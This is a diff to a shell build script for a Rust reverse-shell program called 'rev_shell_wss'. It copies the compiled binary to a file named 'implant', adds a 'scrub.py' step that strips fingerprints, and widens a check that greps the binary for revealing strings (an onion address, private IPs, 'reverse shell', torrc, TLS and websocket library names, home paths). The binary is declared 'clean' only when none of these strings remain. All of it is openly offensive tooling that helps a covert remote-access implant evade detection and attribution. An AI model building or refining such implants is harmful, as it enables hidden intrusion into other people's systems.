@@ -105,24 +105,24 @@ sudo -u "$REAL_USER" bash -c "
 "
 
 BINARY="$DIR/target/release/rev_shell_wss"
+
+ok "Build complete"
+
+# ── Step 6: Scrub binary ──
+banner "Scrubbing binary (removing fingerprints)..."
+python3 scrub.py
+
 STEALTH="$DIR/target/release/implant"
-
 cp "$BINARY" "$STEALTH"
-
-# Scrub build paths
-sed -i "s|$REAL_HOME[^ ]*||g" "$STEALTH"
-sed -i 's|\.cargo/registry/src/[^ ]*||g' "$STEALTH"
-sed -i 's|/home/[^ ]*/build/boring-sys[^ ]*||g' "$STEALTH"
-
 chmod +x "$STEALTH"
 chown "$REAL_USER:$REAL_USER" "$STEALTH"
 
 SIZE=$(du -h "$STEALTH" | cut -f1)
-ok "Binary built: ${STEALTH} (${SIZE})"
+ok "Binary ready: ${GREEN}${STEALTH}${NC} (${SIZE})"
 
-# ── Step 6: Verify binary is clean ──
+# ── Step 7: Verify binary is clean ──
 banner "Verifying binary..."
-LEAKS=$(strings "$STEALTH" | grep -ciE "$ONION|192\.168|/bin/sh|reverse|shell|sudo|systemctl|torrc" || true)
+LEAKS=$(strings "$STEALTH" | grep -ciE "$ONION|192\.168|reverse.shell|sudo|systemctl|torrc|rustls|tungstenite|openssl|certificate|websocket|handshake|/home/" || true)
 if [[ "$LEAKS" -eq 0 ]]; then
     ok "Binary is clean — 0 sensitive strings"
 else
